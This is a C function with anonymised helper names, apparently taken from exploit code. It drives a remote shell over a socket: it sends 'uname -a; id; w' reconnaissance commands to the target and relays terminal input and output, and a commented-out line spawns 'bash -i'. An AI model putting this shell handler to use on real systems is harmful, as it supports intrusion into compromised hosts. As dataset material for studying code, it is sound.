#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  snd ;
typedef  int /*<<< orphan*/  rcv ;
typedef  int /*<<< orphan*/  fd_set ;

/* Variables and functions */
 scalar_t__ FUNC0 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC1 (int,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC2 (char*,int) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 int /*<<< orphan*/  FUNC4 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC5 (char*,int,int /*<<< orphan*/ ) ; 
 int FUNC6 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC7 (char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC8 (char*) ; 
 int FUNC9 (int,char*,int) ; 
 int /*<<< orphan*/  FUNC10 (int,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  stdin ; 
 int /*<<< orphan*/  stdout ; 
 int /*<<< orphan*/  FUNC11 (char*,char*) ; 
 int /*<<< orphan*/  FUNC12 (char*) ; 
 int /*<<< orphan*/  FUNC13 (int,char*,int /*<<< orphan*/ ) ; 

int FUNC14(int sock)
{
char snd[1024], rcv[1024];
fd_set rset;
int maxfd, n;
int received = 0;

//strcpy(snd,"TERM=xterm; export TERM=xterm; exec bash -i\n");
//write(sock, snd, strlen(snd));

FUNC11(snd, "uname -a; id; w\n");
FUNC13(sock, snd, FUNC12(snd));

for (;;)
{
FUNC1(FUNC6(stdin), &rset);
FUNC1(sock, &rset);

maxfd = ( ( FUNC6(stdin) > sock )?FUNC6(stdin):sock ) + 1;
FUNC10(maxfd, &rset, NULL, NULL, NULL);

if (FUNC0(FUNC6(stdin), &rset))
 {
 FUNC2(snd, sizeof(snd));
 FUNC5(snd, sizeof(snd)-2, stdin);
 FUNC13(sock, snd, FUNC12(snd));
 }

if (FUNC0(sock, &rset))
 {
 FUNC2(rcv, sizeof(rcv));
 if ((n = FUNC9(sock, rcv, sizeof(rcv))) == -1)
   {
   FUNC8("FUCK: Error in read\n");
   FUNC3(1);
   }
 if (!n)
   {
   if (!received)
     {
     FUNC8("FUCK: failed.\n\n");
     return 0;
     }
   FUNC8("Connection closed.\n");
   FUNC3(1);
   }

 received = 1;
 FUNC7(rcv, stdout);
 FUNC4(stdout);
 }
}
}